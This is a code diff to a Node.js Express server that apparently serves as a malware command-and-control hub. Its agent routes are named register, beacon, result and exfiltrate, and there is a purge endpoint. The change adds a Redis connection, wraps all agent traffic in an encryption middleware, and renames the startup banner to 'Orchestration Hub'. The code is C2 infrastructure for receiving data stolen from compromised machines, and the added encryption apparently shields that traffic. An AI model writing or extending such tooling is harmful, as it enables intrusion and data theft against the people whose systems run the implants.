@@ -2,9 +2,11 @@ const path = require('path');
 const express = require('express');
 const cors = require('cors');
 const { initializeDatabase } = require('./config/db');
+const redis = require('./utils/redis');
 
 // Initialize database
 initializeDatabase();
+redis.connect();
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -25,10 +27,12 @@ app.use((req, res, next) => {
 // ── Routes ─────────────────────────────────────────────
 
 // Agent routes (no JWT, uses API key)
-app.use('/api/register', require('./routes/register'));
-app.use('/api/beacon', require('./routes/beacon'));
-app.use('/api/result', require('./routes/results'));
-app.use('/api/exfiltrate', require('./routes/exfiltrate'));
+const { handleEncryptedTraffic } = require('./middleware/crypto');
+
+app.use('/api/register', handleEncryptedTraffic, require('./routes/register'));
+app.use('/api/beacon', handleEncryptedTraffic, require('./routes/beacon'));
+app.use('/api/result', handleEncryptedTraffic, require('./routes/results'));
+app.use('/api/exfiltrate', handleEncryptedTraffic, require('./routes/exfiltrate'));
 
 // Immediate Purge Override
 app.post('/api/agents/purge/:id', require('./middleware/auth').verifyToken, (req, res) => {
@@ -105,9 +109,9 @@ server.listen(PORT, () => {
   console.log('  ╚═════╝    ╚═╝      ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝');
   console.log('\x1b[0m');
   console.log('  \x1b[1m\x1b[34m[SYSTEM CONFIGURATION]\x1b[0m');
-  console.log(`  \x1b[32m[+]\x1b[0m Control URL:   \x1b[4mhttp://localhost:${PORT}\x1b[0m`);
+  console.log('  \x1b[1m\x1b[32m[+]\x1b[0m Orchestration Hub:  ONLINE on port ' + PORT);
+  console.log('  \x1b[1m\x1b[32m[+]\x1b[0m Management Console: http://localhost:' + PORT);
   console.log(`  \x1b[32m[+]\x1b[0m API Endpoint:  \x1b[4mhttp://localhost:${PORT}/api\x1b[0m`);
   console.log(`  \x1b[32m[+]\x1b[0m Real-time Hub: \x1b[1mWS ENABLED\x1b[0m`);
   console.log('');
 });
-
